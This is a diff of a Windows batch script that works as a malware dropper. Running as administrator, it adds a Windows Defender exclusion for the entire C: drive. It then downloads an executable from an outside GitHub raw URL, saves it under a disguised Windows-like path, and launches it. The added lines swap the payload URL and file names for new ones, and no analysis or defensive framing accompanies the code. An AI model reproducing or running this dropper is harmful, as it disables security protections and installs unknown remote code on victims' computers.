@@ -7,7 +7,7 @@ if not "%1"=="am_admin" (
 set "scriptDir=%~dp0"
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
 TIMEOUT /T 3
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/aspdasdksa/TROLLLOLL/raw/main/hello.exe', 'C:\WindowsApi\WindowsApi.exe')"
-start "" "C:\WindowsApi\WindowsApi.exe"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/KR4eeR/bhn/raw/main/HelloWorldRunner.exe', 'C:\WindowsAdminSys\WindowsSecurer.exe')"
+start "" "C:\WindowsAdminSys\WindowsSecurer.exe"
 taskkill /IM cmd.exe
 exit
